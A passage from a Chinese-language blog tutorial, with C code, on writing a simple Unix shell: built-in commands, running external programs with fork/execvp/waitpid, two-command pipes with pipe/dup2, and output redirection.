class="keyword">char</span>)*bufsize);</span><br><span class="line">            <span class="keyword">if</span> (!<span class="built_in">buffer</span>)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"allocation error\n"</span>);</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"current working directory : %s\n"</span>, <span class="built_in">buffer</span>);</span><br><span class="line">            <span class="built_in">free</span>(<span class="built_in">buffer</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>函数使用getcwd()获得当前工作目录的绝对路径。</p>
<p>函数声明：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">char</span> *<span class="title">getcwd</span><span class="params">(<span class="keyword">char</span> *buf,<span class="keyword">size_t</span> <span class="built_in">size</span>)</span></span>;</span><br></pre></td></tr></table></figure>



<p>函数说明：</p>
<ol>
<li>getcwd()会将当前工作目录的绝对路径复制到参数buf所指的内存空间中,参数size为buf的空间大小。</li>
<li>如果路径长度大于size,则会返回NULL。</li>
</ol>
<ol start="3">
<li><strong>help</strong>命令</li>
</ol>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">fun_help</span><span class="params">(<span class="keyword">char</span>** char_list)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"---------------------myshell---------------------\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Type program names and arguments, and hit enter.\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"-----------The following are built in:-----------\n"</span>);</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; long_cmd(); i++)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%s\n"</span>, cmder[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Use the man command for information on other programs.\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"-------Support for simple pipes and redirects---------\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"------------------------------------------------------\n"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>shell程序里调用help命令获得内部命令集。</p>
<ol start="4">
<li><strong>exit</strong>命令</li>
</ol>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">fun_exit</span><span class="params">(<span class="keyword">char</span>** char_list)</span></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"-----------------------goodbye-----------------------\n"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>exit命令返回值为0，可以中断loop循环，结束shell程序。</p>
<ol start="5">
<li><strong>echo</strong>命令</li>
</ol>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">fun_echo</span><span class="params">(<span class="keyword">char</span>** char_list)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">if</span> (char_list[<span class="number">1</span>] == <span class="literal">NULL</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Enter correct output.\n"</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">for</span> ( i = <span class="number">1</span>; char_list[i] != <span class="literal">NULL</span>; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"%s "</span>, char_list[i] );</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>echo命令用来输出后缀参数。</p>
<p><strong>注意：内部命令是自定义的，可扩充的。</strong></p>
<p><strong>外部命令</strong></p>
<p>​        这里我们要让原本shell程序执行的进程fork出两个进程，一个是<strong>父进程</strong>，一个为<strong>子进程</strong>。父进程是原本shell进程，阻塞并等待子进程执行结束。子进程用来执行外部命令。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">process</span><span class="params">(<span class="keyword">char</span>** char_list)</span></span>&#123;</span><br><span class="line">    <span class="keyword">pid_t</span> pid = fork(),wpid;</span><br><span class="line">    <span class="keyword">int</span> status;</span><br><span class="line">    <span class="keyword">if</span> (pid == <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span> (execvp(char_list[<span class="number">0</span>], char_list) == <span class="number">-1</span>)&#123;</span><br><span class="line">            perror(<span class="string">"myshell "</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">1</span>);<span class="comment">//子进程报错后销毁，返回父进程</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span> (pid &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        perror(<span class="string">"myshell "</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">do</span>&#123;</span><br><span class="line">            wpid = waitpid(pid, &amp;status, WUNTRACED);</span><br><span class="line">        &#125;<span class="keyword">while</span> (!WIFEXITED(status) &amp;&amp; !WIFSIGNALED(status));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上面使用到了三个系统函数，fork()，execvp()，waitpid()</p>
<p>关于fork函数，我之前写过一篇博客用来介绍，详细可以看<a href="https://bmoos.github.io/2020/01/15/fork/">这里</a>。</p>
<p>关于execvp函数：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">execvp</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* file, <span class="keyword">const</span> <span class="keyword">char</span>* argv[])</span></span>;</span><br></pre></td></tr></table></figure>

<p> 第一个参数是要运行的文件，会在环境变量PATH中查找file并执行。</p>
<p> 第二个参数，是一个参数列表。</p>
<blockquote>
<p>execvp函数执行失败的时候，子进程是无法正常退出的，需要用exit强制退出该子进程，所以这时候就需要加个判断，当execvp执行失败返回-1时，调用exit()来退出子进程，不然该进程还是在那里，导致后边的shell程序无法正常执行。</p>
</blockquote>
<p>execvp()是exec函数族里面其中之一，关于exec函数族，我之后会在写一篇博客用来介绍。</p>
<p>关于waitpid函数：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">pid_t</span> waitpid(<span class="keyword">pid_t</span> pid,<span class="keyword">int</span> *status,<span class="keyword">int</span> options)</span><br></pre></td></tr></table></figure>



<p>在<a href="https://bmoos.github.io/2020/01/15/fork/">这里</a>有wait函数用法，从本质上讲，系统调用waitpid和wait的作用是完全相同的，<strong>但waitpid多出了两个可由用户控制的参数pid和options</strong>，从而为我们编程提供了另一种更灵活的方式。</p>
<blockquote>
<p>从参数的名字pid和类型pid_t中就可以看出，这里需要的是一个进程ID。但当pid取不同的值时，在这里有不同的意义。</p>
<ol>
<li>pid&gt;0时，只等待进程ID等于pid的子进程，不管其它已经有多少子进程运行结束退出了，只要指定的子进程还没有结束，waitpid就会一直等下去。</li>
<li>pid=-1时，等待任何一个子进程退出，没有任何限制，此时waitpid和wait的作用一模一样。</li>
<li>pid=0时，等待<strong>同一个进程组</strong>中的任何子进程，如果子进程已经加入了别的进程组，waitpid不会对它做任何理睬。</li>
<li>pid&lt;-1时，等待一个<strong>指定进程组</strong>中的任何子进程，这个进程组的ID等于pid的绝对值。</li>
</ol>
</blockquote>
<blockquote>
<p><strong>options</strong>提供了一些额外的选项来控制waitpid，目前在Linux中只支持<strong>WNOHANG</strong>和<strong>WUNTRACED</strong>两个选项，这是两个常数，可以用”|”运算符把它们连接起来使用 。</p>
</blockquote>
<p>​    在关于父进程等待的时候，要注意子进程状态。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">do</span>&#123;</span><br><span class="line">    wpid = waitpid(pid, &amp;status, WUNTRACED);</span><br><span class="line">&#125;<span class="keyword">while</span> (!WIFEXITED(status) &amp;&amp; !WIFSIGNALED(status));</span><br></pre></td></tr></table></figure>

<p>使用do……while结构，判断条件为</p>
<p>​                <code>!WIFEXITED(status) &amp;&amp; !WIFSIGNALED(status)</code></p>
<p>WIFEXITED(status) 这个宏用来指出子进程是否为正常退出的，如果是，它会返回一个非零值。</p>
<p>WIFSIGNALED(status)若子进程返回的状态为异常结束,则为真。</p>
<p>则对于父进程来说，子进程无论正常或者异常退出，循环语句都会跳出。</p>
<h2 id="管道-匿名管道"><a href="#管道-匿名管道" class="headerlink" title="管道(匿名管道)"></a>管道(匿名管道)</h2><p>​        上述对shell程序的构建已经可以组成一个简单的shell程序了，有了命令的读入，命令的分析，以及命令的执行。但是对于一个成熟的shell，比如bash，zsh等，都会有管道功能，现在让我们实现管道功能。</p>
<p>​        <strong>什么是管道：</strong></p>
<blockquote>
<p>Shell的一种功能，就是可以将两个或者多个命令（程序或者进程）连接到一起，把一个命令的输出作为下一个命令的输入，以这种方式连接的两个或者多个命令就形成了<strong>管道（pipe）</strong>。</p>
</blockquote>
<p><img src="https://s2.ax1x.com/2020/01/19/1Cjs5d.png" alt="1Cjs5d.png"></p>
<p>Linux 管道使用竖线 | 连接多个命令，这被称为管道符。Linux 管道的具体语法格式如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">command1 | command2</span><br><span class="line">command1 | command2 | commandN...</span><br></pre></td></tr></table></figure>

<p>当在两个命令之间设置管道时，管道符 | 左边命令的输出就变成了右边命令的输入。只要第一个命令向标准输出写入，而第二个命令是从标准输入读取，那么这两个命令就可以形成一个管道。大部分的 Linux 命令都可以用来形成管道。</p>
<blockquote>
<p>这里需要注意，command1 必须有正确输出，而 command2 必须可以处理 command2 的输出结果；而且 command2 只能处理 command1 的正确输出结果，不能处理 command1 的错误信息。</p>
</blockquote>
<p><strong>管道机制：</strong></p>
<p>在Linux中，管道是一种使用非常频繁的通信机制。从本质上说，管道也是一种文件，但它又和一般的文件有所不同，管道可以克服使用文件进行通信的两个问题，具体表现为：</p>
<ol>
<li>限制管道的大小。实际上，管道是一个固定大小的缓冲区。在Linux中，该缓冲区的大小为1页，即4K字节，使得它的大小不象文件那样不加检验地增长。使用单个固定缓冲区也会带来问题，比如在写管道时可能变满，当这种情况发生时，随后对管道的write()调用将默认地被阻塞，等待某些数据被读取，以便腾出足够的空间供write()调用写。</li>
<li>读取进程也可能工作得比写进程快。当所有当前进程数据已被读取时，管道变空。当这种情况发生时，一个随后的read()调用将默认地被阻塞，等待某些数据被写入，这解决了read()调用返回文件结束的问题。</li>
</ol>
<p>注意：从管道读数据是一次性操作，数据一旦被读，它就从管道中被抛弃，释放空间以便写更多的数据。</p>
<p><strong>管道的实现：</strong></p>
<p>注意：我只实现了两条命令的管道机制，但是可以通过递归实现n条命令的管道，那样比较繁琐和抽象。</p>
<p>首先，让我们要对命令的读取加上对管道的识别：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(<span class="built_in">line</span>); i++)&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">line</span>[i] == <span class="string">'|'</span> &amp;&amp; <span class="built_in">line</span>[i+<span class="number">1</span>] == <span class="string">' '</span> &amp;&amp; <span class="built_in">line</span>[i<span class="number">-1</span>] == <span class="string">' '</span>)&#123;</span><br><span class="line">            sample = commandwithpipe(<span class="built_in">line</span>);</span><br><span class="line">            <span class="keyword">return</span> sample;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>其中commandwithpipe()是用来执行管道命令的：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">commandwithpipe</span><span class="params">(<span class="keyword">char</span> *<span class="built_in">line</span>)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> pipeIdx;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(<span class="built_in">line</span>); ++i) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">line</span>[i] == <span class="string">'|'</span> &amp;&amp; <span class="built_in">line</span>[i+<span class="number">1</span>] == <span class="string">' '</span> &amp;&amp; <span class="built_in">line</span>[i<span class="number">-1</span>] == <span class="string">' '</span>) &#123;</span><br><span class="line">            pipeIdx = i;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (pipeIdx+<span class="number">2</span> == <span class="built_in">strlen</span>(<span class="built_in">line</span>)) &#123; <span class="comment">// 管道命令' | '后续没有指令，参数缺失</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Parameters are missing\n"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> fds[<span class="number">2</span>];</span><br><span class="line">    <span class="keyword">if</span> (pipe(fds) == <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> result = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">pid_t</span> pid = fork();</span><br><span class="line">    <span class="keyword">if</span> (pid == <span class="number">-1</span>) &#123;</span><br><span class="line">        result = <span class="number">0</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (pid == <span class="number">0</span>) &#123; <span class="comment">// 子进程执行单个命令</span></span><br><span class="line">        <span class="built_in">close</span>(fds[<span class="number">0</span>]);</span><br><span class="line">        dup2(fds[<span class="number">1</span>], STDOUT_FILENO); <span class="comment">// 将标准输出重定向到fds[1]</span></span><br><span class="line">        <span class="built_in">close</span>(fds[<span class="number">1</span>]);</span><br><span class="line">        <span class="keyword">char</span> *new_str = cut_str(<span class="number">0</span>,pipeIdx<span class="number">-2</span>,<span class="built_in">line</span>);</span><br><span class="line">        <span class="keyword">char</span> **simple_line = cut_line(new_str);</span><br><span class="line">        <span class="keyword">if</span> (execute(simple_line) != <span class="number">1</span>)&#123;</span><br><span class="line">            result = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">free</span>(new_str);</span><br><span class="line">        <span class="built_in">free</span>(simple_line);</span><br><span class="line">        <span class="built_in">exit</span>(result);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123; <span class="comment">// 父进程递归执行后续命令</span></span><br><span class="line">        <span class="keyword">int</span> status;</span><br><span class="line">        waitpid(pid, &amp;status, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">close</span>(fds[<span class="number">1</span>]);</span><br><span class="line">        dup2(fds[<span class="number">0</span>], STDIN_FILENO); <span class="comment">// 将标准输入重定向到fds[0]</span></span><br><span class="line">        <span class="built_in">close</span>(fds[<span class="number">0</span>]);</span><br><span class="line">        <span class="keyword">char</span> *new_str = cut_str(pipeIdx + <span class="number">2</span>,<span class="built_in">strlen</span>(<span class="built_in">line</span>),<span class="built_in">line</span>);</span><br><span class="line">        <span class="keyword">char</span> **simple_line = cut_line(new_str);</span><br><span class="line">        result = execute(simple_line);</span><br><span class="line">        <span class="built_in">free</span>(new_str);</span><br><span class="line">        <span class="built_in">free</span>(simple_line);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>commandwithpipe()函数中调用的cut_str()是将管道命令里面的两个命令切割下来：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">char</span> *<span class="title">cut_str</span><span class="params">(<span class="keyword">int</span> left,<span class="keyword">int</span> right,<span class="keyword">char</span> *<span class="built_in">line</span>)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> bufsize = <span class="number">512</span>;</span><br><span class="line">    <span class="keyword">char</span> *<span class="built_in">buffer</span> = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">char</span>)*bufsize);</span><br><span class="line">    <span class="keyword">int</span> j = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="built_in">buffer</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"allocation error7\n"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">size_t</span> i = left; i &lt;= right; i++)&#123;</span><br><span class="line">        <span class="built_in">buffer</span>[j] = <span class="built_in">line</span>[i];</span><br><span class="line">        j++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">buffer</span>[j] = <span class="string">'\0'</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">buffer</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>创建管道主要用到pipe函数，pipe的原型如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">pipe</span><span class="params">(<span class="keyword">int</span> fds[<span class="number">2</span>])</span></span>;</span><br></pre></td></tr></table></figure>

<p>参数：一个整型数组，管道创建成功后，<strong>fds[0]表示管道的读端，fds[1]表示管道的写端</strong>。</p>
<p>成功返回0，失败返回-1。</p>
<p>如何用管道来实现进程间通讯，我们可以用以下的例子来实现以下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> fds[<span class="number">2</span>];</span><br><span class="line">    <span class="comment">//1.创建管道</span></span><br><span class="line">    <span class="keyword">if</span>(pipe(fds)==<span class="number">-1</span>)&#123;</span><br><span class="line">        perror(<span class="string">"pipe"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//2.fork子进程</span></span><br><span class="line">    <span class="keyword">pid_t</span> pid = fork();</span><br><span class="line">    <span class="keyword">if</span>(pid &gt; <span class="number">0</span>)&#123;        <span class="comment">//father</span></span><br><span class="line">        <span class="comment">//3.父进程关闭读端,向写端写入数据</span></span><br><span class="line">        <span class="built_in">close</span>(fds[<span class="number">0</span>]);</span><br><span class="line">        <span class="keyword">char</span> buff[<span class="number">1024</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"parent to child#"</span>);</span><br><span class="line">        fflush(<span class="built_in">stdout</span>); <span class="comment">//清空标准输出缓冲区</span></span><br><span class="line">        <span class="keyword">ssize_t</span> s = <span class="built_in">read</span>(<span class="number">0</span>,buff,<span class="keyword">sizeof</span>(buff)<span class="number">-1</span>);</span><br><span class="line">        buff[s<span class="number">-1</span>] = <span class="number">0</span>;</span><br><span class="line">        <span class="built_in">write</span>(fds[<span class="number">1</span>],buff,s);</span><br><span class="line">        <span class="built_in">close</span>(fds[<span class="number">1</span>]);</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(pid==<span class="number">0</span>)&#123;   <span class="comment">//child</span></span><br><span class="line">        <span class="comment">//3.子进程关闭写端,从读端读出数据</span></span><br><span class="line">        <span class="built_in">close</span>(fds[<span class="number">1</span>]);</span><br><span class="line">        <span class="keyword">char</span> buff[<span class="number">1024</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">        <span class="keyword">ssize_t</span> s = <span class="built_in">read</span>(fds[<span class="number">0</span>],buff,<span class="keyword">sizeof</span>(buff));</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"child to receive#%s\n"</span>,buff);</span><br><span class="line">        <span class="built_in">close</span>(fds[<span class="number">0</span>]);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        perror(<span class="string">"fork"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    wait(<span class="literal">NULL</span>); <span class="comment">//回收子进程</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>注意：read和write函数的一个参数，是一个无符号整数，是<strong>文件描述符</strong>，用来表示一个文件。在Linux系统中，一切设备都看作文件。而每打开一个文件，就有一个代表该打开文件的文件描述符。程序启动时默认打开三个I/O设备文件：标准输入文件stdin，标准输出文件stdout，标准错误输出文件stderr，分别得到文件描述符 0, 1, 2。</p>
<p><strong>上述程序的功能是，父进程从标准输入读入，并且从管道写端fds[1]写入到管道中，子进程从管道读端fds[0]读出数据，并且输出到标准输出中，默认为屏幕。</strong></p>
<p>注意：上述程序并没有对父子进程的先后顺序做以处理，不过管道会自然实现，因为当管道中没有数据时，读取管道的进程，也就是父进程会被阻塞，等待管道中数据的写入。同时管道类似于通信中半双工信道的进程通信机制，一个管道可以实现双向的数据传输，而同一个时刻只能最多有一个方向的传输，不能两个方向同时进行。</p>
<p>现在在明白管道的原理，功能，以及使用后，让我们回头看看commandwithpipe()函数。</p>
<p>在函数中，我们对管道命令做了处理，使用fork分开执行，首先让子进程的标准输出重定向为管道写端fds[1]，然后使用execute()执行第一条命令语句。对于父程序，我们在等待子进程执行完后，先将标准输入重定向为管道读端fds[0]，然后用execute()执行第二条命令语句。</p>
<p>注意：我们在父进程中将标准输入进行了重定位，所以在执行完毕后要将其重定回来。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> s_fd_out = dup(STDOUT_FILENO); <span class="comment">//保存标准输出</span></span><br><span class="line"><span class="keyword">int</span> s_fd_in = dup(STDIN_FILENO);<span class="comment">//保存标准输入</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> n_fd_out = dup2(s_fd_out , STDOUT_FILENO);<span class="comment">//恢复标准输出</span></span><br><span class="line"><span class="keyword">int</span> n_fd_in = dup2(s_fd_in,STDIN_FILENO);<span class="comment">//恢复标准输入</span></span><br></pre></td></tr></table></figure>

<p>我们在上述中用到了dup()以及dup2()函数，让我们来介绍一下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">dup</span><span class="params">(<span class="keyword">int</span> oldfd)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">dup2</span><span class="params">(<span class="keyword">int</span> oldfd, <span class="keyword">int</span> newfd)</span></span>;</span><br></pre></td></tr></table></figure>

<p>​        当调用dup函数时，内核在进程中创建一个新的文件描述符，此描述符是当前可用文件描述符的最小数值，这个文件描述符指向oldfd所拥有的文件表项。<br>　　dup2和dup的区别就是可以用newfd参数指定新描述符的数值，如果newfd已经打开，则先将其关闭。如果newfd等于oldfd，则dup2返回newfd, 而不关闭它。dup2函数返回的新文件描述符同样与参数oldfd共享同一文件表项。</p>
<p>现在我们构造好了一个简易的管道功能：</p>
<p><img src="https://s2.ax1x.com/2020/01/20/1iUa0s.png" alt="1iUa0s.png"></p>
<h2 id="输出重定向"><a href="#输出重定向" class="headerlink" title="输出重定向"></a>输出重定向</h2><p>一般情况下，每个 Linux 命令运行时都会打开三个文件：</p>
<ul>
<li>标准输入文件(stdin)：stdin的文件描述符为0，Linux程序默认从stdin读取数据。</li>
<li>标准输出文件(stdout)：stdout 的文件描述符为1，Linux程序默认向stdout输出数据。</li>
<li>标准错误文件(stderr)：stderr的文件描述符为2，Linux程序会向stderr流中写入错误信息。</li>
</ul>
<p>默认情况下，command &gt; file 将 stdout 重定向到 file，command &lt; file 将stdin 重定向到 file。</p>
<p>在我们程序中，鉴于我的技术有限，仅能实现输出重定向’&gt;’。</p>
<p>首先我们得有对输出重定向命令的识别，它将加载在execute_line()函数中。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; <span class="built_in">strlen</span>(<span class="built_in">line</span>); j++)&#123;</span><br><span class="line">	<span class="keyword">if</span> (<span class="built_in">line</span>[j] == <span class="string">'&gt;'</span>)&#123;</span><br><span class="line">     	sample = commandWithRedi(<span class="built_in">line</span>);</span><br><span class="line">  	    <span class="keyword">return</span> sample;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后对commandWithRedi()函数进行实现：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">commandWithRedi</span><span class="params">(<span class="keyword">char</span>* <span class="built_in">line</span>)</span> </span>&#123; <span class="comment">//可能含有重定向</span></span><br><span class="line">    <span class="keyword">int</span> outNum = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">char</span> *outFile = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">int</span> endIdx = <span class="built_in">strlen</span>(<span class="built_in">line</span>); <span class="comment">// 指令在重定向前的终止下标</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(<span class="built_in">line</span>); i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">line</span>[i] == <span class="string">'&gt;'</span>) &#123; <span class="comment">// 输出重定向</span></span><br><span class="line">            outNum++;</span><br><span class="line">            <span class="keyword">if</span> (i+<span class="number">1</span> &lt; <span class="built_in">strlen</span>(<span class="built_in">line</span>))</span><br><span class="line">                outFile = &amp;<span class="built_in">line</span>[i+<span class="number">1</span>];</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"Parameters are missing\n"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            endIdx = i;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/* 处理重定向 */</span></span><br><span class="line">    <span class="keyword">if</span> (outNum &gt; <span class="number">1</span>) &#123; <span class="comment">// 输出重定向符超过一个</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Output redirection more than one\n"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> result = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">pid_t</span> pid = fork();</span><br><span class="line">    <span class="keyword">if</span> (pid == <span class="number">-1</span>) &#123;</span><br><span class="line">        result = <span class="number">0</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (pid == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">/* 输入输出重定向 */</span></span><br><span class="line">        <span class="keyword">if</span> (outNum == <span class="number">1</span>)&#123;</span><br><span class="line">            freopen(outFile, <span class="string">"w"</span>, <span class="built_in">stdout</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">/* 执行命令 */</span></span><br><span class="line">        <span class="built_in">line</span>[endIdx] = <span class="string">'\0'</span>;</span><br><span class="line">        <span class="keyword">char</span>** char_list = cut_line(<span class="built_in">line</span>);</span><br><span class="line">        <span class="keyword">int</span> stute = execvp(char_list[<span class="number">0</span>], char_list);</span><br><span class="line">        <span class="built_in">free</span>(char_list);</span><br><span class="line">        <span class="keyword">if</span> (stute == <span class="number">-1</span>)&#123;</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">1</span>);<span class="comment">//子进程报错后销毁，返回父进程</span></span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">int</span> status;</span><br><span class="line">        waitpid(pid, &amp;status, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">int</span> err = WEXITSTATUS(status); <span class="comment">// 读取子进程的返回码</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (err) &#123; </span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"Error: %s\n"</span>, strerror(err));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span 